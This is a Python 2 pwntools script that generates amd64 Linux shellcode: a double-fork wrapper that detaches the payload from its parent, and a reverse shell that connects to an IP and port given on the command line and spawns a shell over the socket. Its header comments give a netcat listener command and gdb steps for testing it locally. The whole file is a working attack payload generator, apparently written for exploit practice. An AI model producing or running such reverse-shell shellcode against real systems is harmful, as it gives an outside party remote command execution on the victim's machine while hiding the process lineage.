# date: 20191216
# author: thinkycx
# description:
#       this script is used to generate shellcode : fork fork and run shellcode and the shellcode's PPID is 0
#       run this script and you will get the program to test the shellcode
# usage:
#       python inject_shellcode.py 127.0.0.1 7777
#       get the process name, such as: /tmp/pwn-asm-cPEmKu/step3
#       terminal1: 
#           nc -lvvp 7777
#       terminal1:
#           gdb /tmp/pwn-asm-cPEmKu/step3 --ex "set follow-fork-mode parent" --ex "start" --ex "break fork_fork_shellcode_end"  --ex "c"


from pwn import *
import pwnlib
import sys


def fork_fork_shellcode(shellcode='/* shellcode */\n nop; \n'):
    '''
    fork- (and continue)
         |_ fork (and exit)
               |_ shellcode (which parent's PID is 0)
    
    registers affected: 
        rax, edi
    '''
    # 1 first fork
    sc = pwnlib.shellcraft.amd64.linux.fork()
    sc += 'cmp rax, 1; \n jnl fork_fork_shellcode_end; \n'          # jmp to the end for parent        jnl -> end       (parent)
    # 2 second fork
    sc += pwnlib.shellcraft.amd64.linux.forkexit()                  # jmp to the shellcode for child   jl  -> shellcode (child)
    # 3 shellcode
    sc += shellcode
    # 4 end
    sc += 'fork_fork_shellcode_end:\n nop; nop; nop; \n'            # use gdb to break fork_fork_shellcode_end+1 and to see the output
    print sc                                                    
    return sc

def reverse_shellcode(ip, port):
    sc = pwnlib.shellcraft.amd64.linux.connect(ip, port, network='ipv4')
    sc += pwnlib.shellcraft.amd64.linux.dupsh(sock='rbp')
    return sc


if __name__ == "__main__":
    ip = '127.0.0.1'
    port = 7777
    context.arch='amd64'

    if len(sys.argv) != 3:
        print '[*] python inject-shellcode.py <ip> <port>'
        exit(0)
    else:
        ip = sys.argv[1]
        port = int(sys.argv[2])
    print '[*] IP %s PORT: %s' % (ip, port)

    shellcode = reverse_shellcode(ip, port)
    sc = fork_fork_shellcode(shellcode)
    # run 
    run_assembly(sc)
    raw_input('exit?')
    



